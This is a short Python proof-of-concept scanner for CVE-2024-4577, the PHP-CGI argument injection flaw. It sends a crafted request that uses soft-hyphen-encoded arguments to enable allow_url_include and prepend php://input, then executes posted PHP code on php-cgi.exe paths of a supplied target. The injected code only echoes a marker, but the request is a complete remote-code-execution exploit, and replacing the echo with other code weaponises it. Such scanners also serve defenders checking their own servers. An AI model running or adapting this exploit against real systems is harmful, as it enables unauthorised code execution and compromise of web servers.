# CVE-2024-4577 PHP-CGI Argument Injection Vulnerability (@Sh0ckFR)

import requests
import argparse

def test_url(base_url, path):
    url = f"{base_url}{path}?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"
    data = "<?php echo \"vulnerable\"; ?>"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    try:
        response = requests.post(url, data=data, headers=headers)
        return "vulnerable" in response.text
    except requests.exceptions.ConnectionError:
        print(f"Unable to reach {base_url}. The server may be down or unreachable.")
        return None

parser = argparse.ArgumentParser(description='Testing CVE-2024-4577 PHP-CGI Argument Injection Vulnerability.')
parser.add_argument('url', type=str, help='The URL of the target (ex: http://127.0.0.1/)')

args = parser.parse_args()
url_base = args.url.rstrip('/')

paths = [
    "/php-cgi/php-cgi.exe",
    "/cgi-bin/php-cgi.exe"
]

print(f"Testing {args.url}...")

vulnerable = False
reachable = False
for path in paths:
    result = test_url(url_base, path)
    if result is None:
        # Skip to next path if server is unreachable
        continue
    reachable = True
    if result:
        print(f"{url_base}{path} is vulnerable!")
        vulnerable = True
    else:
        print(f"{url_base}{path} is NOT vulnerable!")

if reachable and not vulnerable:
    print(f"{url_base} is NOT vulnerable to CVE-2024-4577.")
elif not reachable:
    print(f"Unable to reach any of the tested paths on {url_base}.")
